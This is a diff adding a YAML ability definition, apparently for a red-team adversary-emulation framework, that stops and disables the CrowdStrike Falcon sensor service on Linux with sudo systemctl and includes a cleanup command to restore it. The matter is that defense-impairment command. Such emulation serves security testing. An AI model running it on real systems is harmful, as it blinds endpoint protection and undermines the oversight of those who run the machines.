@@ -1,0 +1,18 @@
+---
+- id: bc55c3967731490dc44e0f05b55b250d
+  name: Stop Crowdstrike Falcon on Linux
+  description: 'Stop and disable Crowdstrike Falcon on Linux
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    linux:
+      sh:
+        command: sudo systemctl stop falcon-sensor.service; sudo systemctl disable
+          falcon-sensor.service
+        payloads: []
+        cleanup: sudo systemctl enable falcon-sensor.service; sudo systemctl start
+          falcon-sensor.service
